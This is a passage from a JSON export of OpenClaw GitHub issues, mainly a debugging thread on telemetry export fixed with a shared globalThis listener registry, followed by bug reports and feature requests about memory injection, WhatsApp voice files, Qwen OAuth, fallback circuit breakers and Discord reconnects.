          "body": "## Testing Update: Plugin Initialization Verified, Investigating Export Flow\n\n### ✅ **What We Confirmed Works**\n\n**1. Plugin Initialization (100% functional):**\n```\n[plugins] diagnostics-otel: NodeSDK started (traces + metrics)\n[plugins] diagnostics-otel: event handlers registered\n[plugins] diagnostics-otel: logs exporter enabled (OTLP/HTTP)\n```\n\n**2. OTEL Collector Configuration:**\n- ✅ Collector running and accepting data\n- ✅ Manual test payload succeeds (HTTP 200)\n- ✅ Debug exporter shows received data\n- ✅ Pipelines configured: traces→Tempo, metrics→Prometheus, logs→Loki\n\n**3. Network Connectivity:**\n- ✅ Gateway container → OTEL Collector endpoint reachable\n- ✅ Tested with `curl` from inside container: HTTP 200\n\n### ⚠️ **Outstanding Issue**\n\nDespite successful initialization, telemetry data is not being automatically exported from Moltbot to the OTEL Collector.\n\n**Test scenario:**\n```bash\n# Send message to generate diagnostic events\ndocker exec gateway node dist/index.js message send --target \"+5531...\" --message \"test\"\n# Result: Message sent successfully, but no telemetry in OTEL Collector logs\n```\n\n### 🔍 **Investigation Findings**\n\n**Added debug logging to track execution flow:**\n```typescript\n// After NodeSDK.start()\nctx.logger.info(\"diagnostics-otel: NodeSDK started (traces + metrics)\");\n\n// After event handler registration  \nctx.logger.info(\"diagnostics-otel: event handlers registered\");\n\n// Inside event handler\nctx.logger.debug(`diagnostics-otel: received event type=${evt.type}`);\n```\n\n**Observations:**\n- Initialization logs appear ✅\n- No debug logs for received events (may be log level issue)\n- No errors in gateway or OTEL Collector logs\n- OTEL Collector shows zero activity after gateway starts\n\n### 🤔 **Potential Root Causes**\n\n1. **Event Emission**: `emitDiagnosticEvent()` calls may not be happening for test scenarios\n   - CLI commands might not trigger diagnostic events\n   - Need to test with real user interactions (e.g., WhatsApp message)\n\n2. **Network Resolution**: `host.docker.internal` resolves to IPv6\n   ```bash\n   $ docker exec gateway getent hosts host.docker.internal\n   fdc4:f303:9324::254 host.docker.internal\n   ```\n   - OpenTelemetry SDK may have IPv4/IPv6 preference issues\n   - Worth testing with direct IPv4 address\n\n3. **SDK Configuration**: Missing initialization parameter or timing issue\n   - NodeSDK may need explicit resource/exporter configuration\n   - Flush intervals may be too long (currently 5000ms)\n\n4. **OpenTelemetry v2.x Compatibility**: Subtle behavior change\n   - API migration is correct, but runtime behavior may differ\n   - May need to verify exporter instantiation order\n\n### 📋 **Next Steps**\n\n**Immediate testing:**\n1. Test with direct IPv4 endpoint instead of `host.docker.internal`\n2. Generate events via real channel interaction (WhatsApp message)\n3. Reduce flush interval to 1000ms\n4. Add error handlers to SDK initialization to catch silent failures\n\n**If issues persist:**\n1. Compare with working OpenTelemetry examples using same SDK versions\n2. Check if manual instrumentation works (bypass diagnostic events)\n3. Verify OpenTelemetry SDK environment variables\n4. Test with older OpenTelemetry SDK versions (pre-v2.x)\n\n### 💭 **Recommendation**\n\nThe PR (#4255) should still be merged as the API compatibility fixes are correct and necessary. The export flow issue appears to be a separate concern related to either:\n- Configuration/environment specifics\n- Diagnostic event emission in our test setup\n- Network resolution edge case\n\nWe can continue investigating the export flow as a follow-up issue if needed.\n\n---\n\n**Testing Environment:**\n- OS: Linux (WSL2)\n- Docker: Desktop on Windows\n- Node: v22.22.0\n- Moltbot: Built from `main` branch with PR #4255 changes\n- OTEL Collector: `otel/opentelemetry-collector-contrib:latest` (v0.144.0)"
        },
        {
          "id": 3821537189,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/3201#issuecomment-3821537189",
          "createdAt": "2026-01-30T02:58:21Z",
          "updatedAt": "2026-01-30T02:58:21Z",
          "author": "dillera",
          "body": "I have it sending one single test data to honeycomb, but there is something wrong with the core sending of telemetry outside of the plugin."
        },
        {
          "id": 3821553923,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/3201#issuecomment-3821553923",
          "createdAt": "2026-01-30T03:03:41Z",
          "updatedAt": "2026-01-30T16:11:25Z",
          "author": "arbgjr",
          "body": "I'm finalizing the root cause investigation process... I'll have updates soon...."
        },
        {
          "id": 3821559426,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/3201#issuecomment-3821559426",
          "createdAt": "2026-01-30T03:06:04Z",
          "updatedAt": "2026-01-30T16:11:26Z",
          "author": "arbgjr",
          "body": "## Root Cause Analysis Complete ✅\n\nI've identified the root cause of why telemetry events are not being exported to the OTEL Collector.\n\n### The Problem\n\nThe `diagnostic-events.ts` module is being loaded **twice**, creating two separate instances with independent listener Sets:\n\n```\n[DEBUG] diagnostic-events module loaded, instance=9jtkm, import.meta.url=file:///app/dist/infra/diagnostic-events.js\n[DEBUG] diagnostic-events module loaded, instance=q54xqa, import.meta.url=file:///app/dist/infra/diagnostic-events.js\n```\n\n**Timeline:**\n1. Instance `9jtkm` is loaded during core initialization\n2. Instance `q54xqa` is loaded 35 seconds later when plugins are loaded via jiti\n3. The `diagnostics-otel` plugin registers its event listener on instance `q54xqa`:\n   ```\n   [DEBUG] onDiagnosticEvent: registered listener, total=1, instance=q54xqa\n   ```\n4. But events are emitted by instance `9jtkm`:\n   ```\n   [DEBUG] emitDiagnosticEvent: NO LISTENERS for type=message.queued, instance=9jtkm\n   ```\n\n### Why This Happens\n\nThe plugin loader uses **jiti** (lines 207-218 in `src/plugins/loader.ts`) to dynamically load plugins. Jiti creates an isolated module context, which causes it to reload all dependencies—including core singleton modules like `diagnostic-events.ts`.\n\nThis results in:\n- Core code uses instance 1 (emits events)\n- Plugin code uses instance 2 (registers listeners)\n- Events never reach listeners ❌\n\n### Proposed Solutions\n\n**Option 1: Configure jiti externals**\nAdd `diagnostic-events` to jiti's externals list to prevent reloading:\n```typescript\nconst jiti = createJiti(import.meta.url, {\n  interopDefault: true,\n  extensions: [\".ts\", \".tsx\", ...],\n  alias: { ... },\n  externals: [\n    /^\\.\\.\\/infra\\/diagnostic-events\\.js$/,\n  ],\n});\n```\n\n**Option 2: Export singleton from plugin-sdk**\nMake `plugin-sdk` export the core instance of diagnostic event functions rather than re-exporting them:\n```typescript\n// In src/plugin-sdk/index.ts\n// Instead of: export { onDiagnosticEvent } from \"../infra/diagnostic-events.js\"\n// Use: export const onDiagnosticEvent = coreInstance.onDiagnosticEvent;\n```\n\n**Option 3: Use shared global registry**\nStore the listeners Set in a global location that persists across module reloads (e.g., `globalThis`).\n\n### Next Steps\n\nI can implement any of these solutions. Which approach would you prefer? Option 1 seems cleanest to me, as it prevents the module duplication at the source.\n\nThe OpenTelemetry v2.x compatibility fixes (#4255) are working correctly—this is a separate architectural issue with how plugins share singleton modules with the core."
        },
        {
          "id": 3821578172,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/3201#issuecomment-3821578172",
          "createdAt": "2026-01-30T03:14:10Z",
          "updatedAt": "2026-01-30T16:11:26Z",
          "author": "arbgjr",
          "body": "## ✅ Solution Implemented and Tested\n\nI've successfully implemented **Option 3: Shared Global Registry** and confirmed it works end-to-end.\n\n### Implementation\n\nModified `src/infra/diagnostic-events.ts` to use `globalThis` to share the listeners Set across multiple module instances:\n\n```typescript\nconst globalKey = Symbol.for(\"moltbot:diagnostic-events\");\ntype GlobalState = {\n  seq: number;\n  listeners: Set<(evt: DiagnosticEventPayload) => void>;\n};\nconst global = globalThis as typeof globalThis & { [key: symbol]: GlobalState };\nif (!global[globalKey]) {\n  global[globalKey] = {\n    seq: 0,\n    listeners: new Set<(evt: DiagnosticEventPayload) => void>(),\n  };\n}\nconst sharedState = global[globalKey];\nconst listeners = sharedState.listeners;\n```\n\n### Test Results\n\n**Before:**\n```\n[DEBUG] emitDiagnosticEvent: NO LISTENERS for type=message.queued, instance=9jtkm\n[DEBUG] emitDiagnosticEvent: NO LISTENERS for type=session.state, instance=9jtkm\n```\n\n**After:**\n- No more \"NO LISTENERS\" errors ✅\n- OTEL Collector receiving metrics:\n  ```\n  Metric #0 -> Name: moltbot.message.queued\n  ResourceMetrics being exported successfully\n  ```\n\n### Why This Works\n\nBoth module instances (core and jiti-loaded plugin) now reference the **same** listeners Set in `globalThis`, so:\n- Events emitted by core instance → reach listeners\n- Listeners registered by plugin instance → receive events ✅\n\nThis is a safe workaround until the jiti loader configuration can be updated to prevent duplicate module loading.\n\n### Next Steps\n\nShould I:\n1. Clean up the debug logs and finalize this solution?\n2. Or pursue Option 1 (jiti externals) as a cleaner architectural fix?\n\nThe globalThis approach works but feels like a workaround. Happy to implement the jiti externals solution if preferred for long-term maintainability."
        },
        {
          "id": 3821584984,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/3201#issuecomment-3821584984",
          "createdAt": "2026-01-30T03:17:33Z",
          "updatedAt": "2026-01-30T16:11:26Z",
          "author": "arbgjr",
          "body": "@haoling @dillera @barvhaim @sebslight \n\n> ## ✅ Solution Implemented and Tested\n> I've successfully implemented **Option 3: Shared Global Registry** and confirmed it works end-to-end.\n> \n> ### Implementation\n> Modified `src/infra/diagnostic-events.ts` to use `globalThis` to share the listeners Set across multiple module instances:\n> \n> const globalKey = Symbol.for(\"moltbot:diagnostic-events\");\n> type GlobalState = {\n>   seq: number;\n>   listeners: Set<(evt: DiagnosticEventPayload) => void>;\n> };\n> const global = globalThis as typeof globalThis & { [key: symbol]: GlobalState };\n> if (!global[globalKey]) {\n>   global[globalKey] = {\n>     seq: 0,\n>     listeners: new Set<(evt: DiagnosticEventPayload) => void>(),\n>   };\n> }\n> const sharedState = global[globalKey];\n> const listeners = sharedState.listeners;\n> ### Test Results\n> **Before:**\n> \n> ```\n> [DEBUG] emitDiagnosticEvent: NO LISTENERS for type=message.queued, instance=9jtkm\n> [DEBUG] emitDiagnosticEvent: NO LISTENERS for type=session.state, instance=9jtkm\n> ```\n> \n> **After:**\n> \n> * No more \"NO LISTENERS\" errors ✅\n> * OTEL Collector receiving metrics:\n>   ```\n>   Metric #0 -> Name: moltbot.message.queued\n>   ResourceMetrics being exported successfully\n>   ```\n> \n> ### Why This Works\n> Both module instances (core and jiti-loaded plugin) now reference the **same** listeners Set in `globalThis`, so:\n> \n> * Events emitted by core instance → reach listeners\n> * Listeners registered by plugin instance → receive events ✅\n> \n> This is a safe workaround until the jiti loader configuration can be updated to prevent duplicate module loading.\n> \n> ### Next Steps\n> Should I:\n> \n> 1. Clean up the debug logs and finalize this solution?\n> 2. Or pursue Option 1 (jiti externals) as a cleaner architectural fix?\n> \n> The globalThis approach works but feels like a workaround. Happy to implement the jiti externals solution if preferred for long-term maintainability.\n\n"
        },
        {
          "id": 3826060008,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/3201#issuecomment-3826060008",
          "createdAt": "2026-01-30T22:20:39Z",
          "updatedAt": "2026-01-30T22:20:39Z",
          "author": "Kuberwastaken",
          "body": "Ran a couple models for diagnostics but no real solution found on my end yet, interesting problem though"
        },
        {
          "id": 3839270503,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/3201#issuecomment-3839270503",
          "createdAt": "2026-02-03T06:09:44Z",
          "updatedAt": "2026-02-03T06:09:44Z",
          "author": "Gaurang-Patel",
          "body": "I'm getting this issue https://github.com/openclaw/openclaw/issues/6989"
        },
        {
          "id": 3842698560,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/3201#issuecomment-3842698560",
          "createdAt": "2026-02-03T17:37:41Z",
          "updatedAt": "2026-02-03T17:37:41Z",
          "author": "jannikmaierhoefer",
          "body": "+1"
        },
        {
          "id": 3843869766,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/3201#issuecomment-3843869766",
          "createdAt": "2026-02-03T21:52:25Z",
          "updatedAt": "2026-02-03T21:52:25Z",
          "author": "quintona",
          "body": "+1 "
        },
        {
          "id": 3864906112,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/3201#issuecomment-3864906112",
          "createdAt": "2026-02-07T17:29:33Z",
          "updatedAt": "2026-02-07T17:29:33Z",
          "author": "pranay01",
          "body": "facing a similar issue - https://github.com/openclaw/openclaw/issues/11294\n"
        },
        {
          "id": 3865674293,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/3201#issuecomment-3865674293",
          "createdAt": "2026-02-07T22:38:27Z",
          "updatedAt": "2026-02-07T22:38:27Z",
          "author": "barvhaim",
          "body": "If you have LiteLLM proxy for LLM you can do the OTEL from there"
        },
        {
          "id": 3867024908,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/3201#issuecomment-3867024908",
          "createdAt": "2026-02-08T11:22:13Z",
          "updatedAt": "2026-02-08T11:22:13Z",
          "author": "Glucksberg",
          "body": "📋 **Duplicate triage note:** The following open issue appears to report the same problem:\n- #10385 — diagnostics-otel plugin fails with OTel v2.x\nConsider consolidating discussion here."
        },
        {
          "id": 3874359262,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/3201#issuecomment-3874359262",
          "createdAt": "2026-02-09T23:10:15Z",
          "updatedAt": "2026-02-10T20:27:49Z",
          "author": "vincentkoc",
          "body": "~~Hi all, i have a stable fix on https://github.com/openclaw/openclaw/pull/12897 which addresses all the issues and all tests are passing~~.\n\nMy most stable PR #12897 uppon deeper testing revealed there are more deep-routed issue in how events are routed. Events are emitted within OpenClaw but not to OTel.\n\nFurther investiging so for now i have marked my PR #12897 as draft. All the other open PRs for this have same issue, I will give screenshots of it working once I have finished."
        },
        {
          "id": 3881254827,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/3201#issuecomment-3881254827",
          "createdAt": "2026-02-10T23:22:37Z",
          "updatedAt": "2026-02-10T23:22:37Z",
          "author": "vincentkoc",
          "body": "My PR is now emitting OTel and i was able to get the copy screenshot at https://github.com/openclaw/openclaw/pull/12897#issuecomment-3881250986 from a live instance. Will do testing of all the metrics, logs and states and finalize PR for review."
        },
        {
          "id": 3881588553,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/3201#issuecomment-3881588553",
          "createdAt": "2026-02-11T01:13:35Z",
          "updatedAt": "2026-02-11T01:13:35Z",
          "author": "vincentkoc",
          "body": "Fixed OTEL 👍 validated on client-side logger and on cloud version of [Opik](https://github.com/comet-ml/opik/) to verify with an external cloud OTel collector\n\n\n<img width=\"3370\" height=\"2154\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/33b53eb6-008e-4f92-8104-fbbbc9b27004\" />\n\n\nBeyond the changes to the service.ts for v2 OTel upgrades. In the existing setup, each module instance had its own local listeners, so OTEL could miss events even when diagnostics were firing.\n\nSo even after the main bug was fixed events (not all events) were streamed to OTel. I fixed the split event-bus bug by moving diagnostics state (`seq` + `listeners`) to one global singleton (`globalThis`) so core and plugins share the same stream. Log bus was not touched.\n\nPR https://github.com/openclaw/openclaw/pull/12897 ready for review."
        }
      ]
    },
    {
      "number": 13773,
      "title": "[Feature]: Request iOS TestFlight Access - bostrovsky@mac.com",
      "body": "## GitHub Username\nbostrovsky\n\n## Email (for TestFlight)\nbostrovsky@mac.com\n\n## Use Case\n- iOS node for voice/Talk Mode integration\n- Calendar, Contacts, Reminders access from iPhone  \n- Camera and location capabilities\n- Already running OpenClaw Gateway on macOS (v2026.2.9)\n\n## Additional Context\n- Familiar with the node pairing process\n- Happy to provide feedback during beta\n\nThanks! 🦞\n",
      "state": "closed",
      "comments": 1,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13773",
      "createdAt": "2026-02-11T01:10:15Z",
      "updatedAt": "2026-02-11T01:10:31Z",
      "author": "bostrovsky",
      "labels": [
        "enhancement",
        "r: testflight"
      ],
      "taxonomy": {
        "channels": [],
        "platforms": [
          "macos"
        ],
        "components": [
          "gateway"
        ]
      },
      "commentsData": [
        {
          "id": 3881581160,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/13773#issuecomment-3881581160",
          "createdAt": "2026-02-11T01:10:30Z",
          "updatedAt": "2026-02-11T01:10:30Z",
          "author": "openclaw-barnacle[bot]",
          "body": "Not available, build from source."
        }
      ]
    },
    {
      "number": 11618,
      "title": "Hook to inject relevant memory on session start",
      "body": "Add a `memory-inject` hook that loads relevant memory files at session start, injecting them into the bootstrap context.\n\n**Problem:**\nCurrently, even though memory is saved, the agent doesn't automatically load it on new sessions. This breaks continuity and requires manual commands to restore context.\n\n**Proposed solution:**\n\nNew hook: `memory-inject`\n\n**Trigger:** `agent:bootstrap` or `session:start`\n\n**Behavior:**\n1. Scan `memory/YYYY-MM/*.md` files\n2. Filter by:\n   - Date (load last N days)\n   - Channel (match current session)\n   - Keywords/relevance\n3. Inject into `context.bootstrapFiles`\n4. Limit to configurable max tokens\n\n**Example config:**\n```json\n{\n  \"hooks\": {\n    \"internal\": {\n      \"entries\": {\n        \"memory-inject\": {\n          \"enabled\": true,\n          \"daysToLoad\": 7,\n          \"maxTokens\": 4000,\n          \"byChannel\": true,\n          \"relevanceFilters\": [\"project\", \"urgent\", \"todo\"]\n        }\n      }\n    }\n  }\n}\n```\n\n**Benefits:**\n- Seamless context continuity across sessions\n- No manual memory loading needed\n- Channel-specific context isolation\n- Configurable memory depth\n\n**Priority:** 🟠 High",
      "state": "open",
      "comments": 2,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/11618",
      "createdAt": "2026-02-08T02:32:59Z",
      "updatedAt": "2026-02-11T01:07:46Z",
      "author": "murilo",
      "labels": [
        "enhancement"
      ],
      "taxonomy": {
        "channels": [],
        "platforms": [],
        "components": [
          "config"
        ]
      },
      "commentsData": [
        {
          "id": 3868588945,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/11618#issuecomment-3868588945",
          "createdAt": "2026-02-08T23:54:07Z",
          "updatedAt": "2026-02-08T23:54:07Z",
          "author": "globalcaos",
          "body": "Love this proposal. We have a closely related need: **customizable session start prompt**.\n\nCurrently `BARE_SESSION_RESET_PROMPT` is hardcoded in `get-reply-run.ts`. Anyone who customizes it (e.g., to load specific workspace files, set persona, or inject memory) faces merge conflicts on every upstream update.\n\n**Suggestion:** Extend this hook (or add a sibling) to also support a **file-based session start prompt** — e.g., reading `SESSION_START.md` or `BOOT.md` from the workspace:\n\n```json\n{\n  \"hooks\": {\n    \"internal\": {\n      \"entries\": {\n        \"memory-inject\": {\n          \"enabled\": true,\n          \"sessionStartFile\": \"SESSION_START.md\",\n          \"daysToLoad\": 3,\n          \"maxTokens\": 4000\n        }\n      }\n    }\n  }\n}\n```\n\nThis way the agent's bootstrap behavior is fully workspace-configurable without touching core code. Combined with the memory injection you describe, it would solve both problems:\n1. ✅ Context continuity (your proposal)\n2. ✅ Custom boot behavior without merge conflicts\n\nHappy to help with a PR if there's interest."
        },
        {
          "id": 3881574561,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/11618#issuecomment-3881574561",
          "createdAt": "2026-02-11T01:07:46Z",
          "updatedAt": "2026-02-11T01:07:46Z",
          "author": "murilo",
          "body": "@globalcaos Thank you for the feedback and enthusiasm! 🎉\n\nI love the `SESSION_START.md` idea — it's the perfect complement to automatic injection. Here's how I'm thinking we could combine both approaches:\n\n### Hybrid Approach: Auto + Manual\n\n```typescript\ninterface MemoryInjectConfig {\n  enabled: boolean;\n  // Automatic injection\n  daysToLoad: number;\n  maxTokens: number;\n  byChannel: boolean;\n  keywords?: string[];\n  // Manual injection (your idea!)\n  customFiles?: string[];  // e.g., [\"SESSION_START.md\", \"CONTEXT.md\"]\n  customFilesFirst?: boolean;\n}\n```\n\nThis way automatic memory recall and custom boot behavior work together without touching core code — exactly as you described.\n\n### Questions\n\n1. Should custom files be injected **before** or **after** auto content? (Or make it configurable?)\n2. Should custom files respect the token budget, or always be included?\n3. Any other files you'd want beyond `SESSION_START.md`?\n\n### Implementation Plan\n\nWould you be interested in collaborating?\n\n1. **Phase 1:** Basic memory-inject hook (auto only) — PR ready\n2. **Phase 2:** Add customFiles support — could use your input here!\n\nHappy to incorporate this into the PR if the maintainers are open to it."
        }
      ]
    },
    {
      "number": 13762,
      "title": "WhatsApp Desktop voice messages download as 0-byte files",
      "body": "## Issue\nWhatsApp Desktop (Mac) voice messages are being detected but not downloaded properly. Files arrive as 0-byte  files in .\n\n## Expected Behavior\nVoice messages from WhatsApp Desktop should download with actual audio content, similar to mobile voice messages.\n\n## Actual Behavior\n- **Mobile (phone) voice messages:** ✅ Working correctly (proper audio + transcripts)\n- **Desktop (Mac) voice messages:** ❌ 0-byte files\n\n## Examples\n- `b4232f84-0b7b-4886-9baf-890e1fd5ef56.ogg` - 0 bytes\n- `384eabdd-facc-4b8c-835c-6bdfb042a70b.ogg` - 0 bytes\n\n## Environment\n- OpenClaw running on Linux (aibox)\n- WhatsApp Desktop on Mac\n- Channel: WhatsApp\n\n## Impact\nUsers must use mobile phone for voice messages until this is fixed.\n\n## Reproducibility\nConsistent - all Desktop voice messages result in 0-byte files.",
      "state": "open",
      "comments": 1,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13762",
      "createdAt": "2026-02-11T00:54:36Z",
      "updatedAt": "2026-02-11T01:04:32Z",
      "author": "josteins",
      "labels": [],
      "taxonomy": {
        "channels": [
          "whatsapp"
        ],
        "platforms": [
          "macos",
          "linux"
        ],
        "components": []
      },
      "commentsData": [
        {
          "id": 3881566640,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/13762#issuecomment-3881566640",
          "createdAt": "2026-02-11T01:04:32Z",
          "updatedAt": "2026-02-11T01:04:32Z",
          "author": "josteins",
          "body": "It seems like potentially it's just actually sending the audio message directly to the LLM without transcribing it when it comes from the Mac. Have you seen this anywhere else? "
        }
      ]
    },
    {
      "number": 11684,
      "title": "[Bug]:  If OAuth fails, verify your Qwen account has portal access and try again.",
      "body": "openclaw configure --section model执行时 选择Qwen 无法弹出授权页面",
      "state": "closed",
      "comments": 3,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/11684",
      "createdAt": "2026-02-08T05:00:39Z",
      "updatedAt": "2026-02-11T01:03:35Z",
      "author": "Fyg666",
      "labels": [
        "bug"
      ],
      "taxonomy": {
        "channels": [],
        "platforms": [],
        "components": [
          "config"
        ]
      },
      "commentsData": [
        {
          "id": 3866161798,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/11684#issuecomment-3866161798",
          "createdAt": "2026-02-08T05:01:11Z",
          "updatedAt": "2026-02-08T05:01:11Z",
          "author": "Fyg666",
          "body": "报错 \nWhere will the Gateway run?\n│  Local (this machine)\n│\n◇  Model/auth provider\n│  Qwen\n│\n◇  Qwen auth method\n│  Qwen OAuth\n│\n◇  Qwen OAuth failed\n│\n◇  Qwen OAuth ────────────────────────────────────────────────────────────────╮\n│                                                                             │\n│  If OAuth fails, verify your Qwen account has portal access and try again.  │\n│                                                                             │\n├─────────────────────────────────────────────────────────────────────────────╯\nTypeError: fetch failed\n"
        },
        {
          "id": 3875407134,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/11684#issuecomment-3875407134",
          "createdAt": "2026-02-10T05:22:27Z",
          "updatedAt": "2026-02-10T05:22:27Z",
          "author": "thewilloftheshadow",
          "body": "Closing for now: this issue doesn't include enough detail to evaluate (no repro steps/environment for bugs, or clear use-case/scope for features). Please open a new issue with those details and we can take another look.\n"
        },
        {
          "id": 3881564387,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/11684#issuecomment-3881564387",
          "createdAt": "2026-02-11T01:03:35Z",
          "updatedAt": "2026-02-11T01:03:35Z",
          "author": "songyongshun",
          "body": "I encounter this because I using iptables to filter all traffic from abroad. It is fixed when let all traffic go, for your reference."
        }
      ]
    },
    {
      "number": 13760,
      "title": "Feature Request: Circuit Breaker for Model Fallback Chain on Billing/Quota Failures",
      "body": "**Feature Request**\n\n**Problem**: When a provider in the model fallback chain fails due to billing or quota issues (e.g., 402 errors for insufficient credits), OpenClaw retries the failing provider on each new message before moving to the next fallback. This causes repeated error messages and delays in response, disrupting the user experience. A recent incident with OpenRouter (credit limit reached) resulted in multiple failed attempts before switching to another provider.\n\n**Proposed Solution**: Implement a circuit breaker mechanism for the model fallback chain. If a provider fails with a billing or quota error (e.g., HTTP 402, 429 with quota message), temporarily skip that provider for a configurable period (e.g., 24 hours) or until manually reset. This prevents repeated failures and allows the system to move to viable fallbacks immediately.\n\n**Suggested Behavior**:\n1. On detecting a billing/quota failure (specific error codes or messages), mark the provider as \"tripped\" for X hours.\n2. Skip tripped providers in the fallback chain during this period.\n3. Log the event with a clear message (e.g., \"Provider X skipped due to billing failure until YYYY-MM-DD HH:MM\").\n4. Optional: Allow manual reset via config or command if credits are topped up sooner.\n\n**Benefits**:\n- Reduces user-facing errors and delays by avoiding known failing providers.\n- Aligns with industry best practices for API resilience (e.g., circuit breakers in microservices).\n- Improves fallback chain efficiency.\n\n**Use Case**: In a multi-provider setup (Anthropic → xAI → Google), if xAI runs out of credits, OpenClaw should skip xAI after the first failure and go straight to Google for the next 24 hours, rather than failing repeatedly.\n\n**Environment**:\n- OpenClaw Version: 2026.2.9 (33c75cb)\n- OS: macOS (Darwin 25.2.0 arm64)\n- Context: Running on local machine with multiple cloud providers\n\n**Additional Notes**: Until this feature is implemented, users must manually edit  to remove problematic providers, which requires a restart and risks disrupting running tasks. A built-in circuit breaker would automate this gracefully.\n\nThanks for considering this enhancement to make OpenClaw's fallback system more robust!",
      "state": "open",
      "comments": 0,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13760",
      "createdAt": "2026-02-11T00:47:32Z",
      "updatedAt": "2026-02-11T00:47:32Z",
      "author": "ToneLoke",
      "labels": [],
      "taxonomy": {
        "channels": [],
        "platforms": [
          "macos"
        ],
        "components": [
          "gateway",
          "config",
          "websocket"
        ]
      }
    },
    {
      "number": 8933,
      "title": "[Bug]: Openclaw return in Json format instead of executing them",
      "body": "## Summary\n\nWhat went wrong?\n\nI did install openclaw and used Qwen3 succesfully, but it was too slow so i switch to a smaller model Qwen2.5-coder:3b, after I pull it and changed openclaw.json, i try again, but the model only respons in json format (basically repeating my input) and not the answer.\n\n## Expected behavior\n\nWhat did you expect to happen?\n\nAnswer in normal language, and answer the questions.\n\n## Actual behavior\n\nWhat actually happened?\n\n<img width=\"1277\" height=\"565\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/9ffbe6dd-ffd1-4339-9234-e8977a8dd15d\" />\n\n## Environment\n\n- Openclaw version: 2026.2.2-3\n- OS: Window 11\n- Install method (pnpm/npx/docker/etc): npm\n\n## Logs or screenshots\nlogs when I send a message in broswer dashboard to openclaw\n<img width=\"1057\" height=\"692\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/a52702ed-3da3-4efa-be76-48a8c4739375\" />\n\nopenclaw status\n<img width=\"1057\" height=\"831\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/9bb0affe-dd0d-4dbe-84c3-e64e81ab8cc9\" />\n\n<img width=\"1062\" height=\"828\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/94a6bf50-9e68-42f8-99c2-cbc50540d32b\" />\n\nopenclaw.json\n\n<img width=\"1032\" height=\"862\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/db7442aa-640c-41f8-bf64-1c25441e9889\" />\n\n<img width=\"973\" height=\"776\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/c85044a8-3ca4-4690-a5d6-ca2020a091aa\" />\n\n",
      "state": "open",
      "comments": 1,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/8933",
      "createdAt": "2026-02-04T16:16:04Z",
      "updatedAt": "2026-02-11T00:41:18Z",
      "author": "s92225",
      "labels": [
        "bug"
      ],
      "taxonomy": {
        "channels": [],
        "platforms": [
          "docker"
        ],
        "components": [
          "web-ui",
          "config"
        ]
      },
      "commentsData": [
        {
          "id": 3881510356,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/8933#issuecomment-3881510356",
          "createdAt": "2026-02-11T00:41:18Z",
          "updatedAt": "2026-02-11T00:41:18Z",
          "author": "irtiq7",
          "body": "I have the exact same issue. Is there any fix?"
        }
      ]
    },
    {
      "number": 13688,
      "title": "Discord: WebSocket 1005/1006 disconnects with failing resume logic and unbounded backoff",
      "body": "## Summary\nDiscord WebSocket connections repeatedly drop (codes 1005/1006), resume attempts fail, and exponential backoff grows without bound, leaving the bot offline for 30+ minutes. DMs are silently lost during downtime.\n\n## Environment\n- **OpenClaw version:** 2026.1.24-3\n- **OS:** macOS (Darwin 25.3.0, arm64)\n- **Channel:** Discord Bot API via channels.discord.js\n- **Network:** Residential broadband (stable, other channels working)\n\n## Expected Behavior\n- Discord gateway reconnects within 5-10 seconds of disconnect\n- Resume session or fresh IDENTIFY on resume failure\n- Messages queued/delivered after reconnection\n\n## Actual Behavior\n- WebSocket closes with 1005/1006 (abnormal closure)\n- Resume attempts fail repeatedly\n- Backoff escalates: 1s → 2s → 4s → 8s → 16s → ...\n- \"connection stalled: no HELLO received within 30000ms\"\n- Bot offline for 30+ minutes\n\n## Logs\n```\n2026-01-27T13:49:49.752Z [discord] gateway: WebSocket connection closed with code 1005\n2026-01-27T13:50:19.238Z [discord] gateway: Attempting resume with backoff: 1000ms\n2026-01-27T13:50:19.526Z [discord] gateway: WebSocket connection closed with code 1005\n2026-01-27T14:02:43.531Z [discord] connection stalled: no HELLO received within 30000ms\n2026-01-27T14:02:44.069Z [discord] gateway: WebSocket connection closed with code 1006\n```\n\n## Configuration\n```json\n{\n  \"channels\": {\n    \"discord\": {\n      \"enabled\": true,\n      \"dm\": { \"policy\": \"open\", \"allowFrom\": [\"*\"] }\n    }\n  }\n}\n```\n\nNo `retry` or gateway reconnect configuration options available for WebSocket-level issues.\n\n## Comparison: WhatsApp Has Gateway Reconnect Config\nWhatsApp channel supports explicit reconnection tuning:\n```json\n{\n  \"web\": {\n    \"reconnect\": {\n      \"initialMs\": 2000,\n      \"maxMs\": 120000,\n      \"factor\": 1.4,\n      \"jitter\": 0.2\n    }\n  }\n}\n```\n\n**Request:** Add similar `channels.discord.gateway.reconnect` configuration.\n\n## Potential Root Causes\n1. 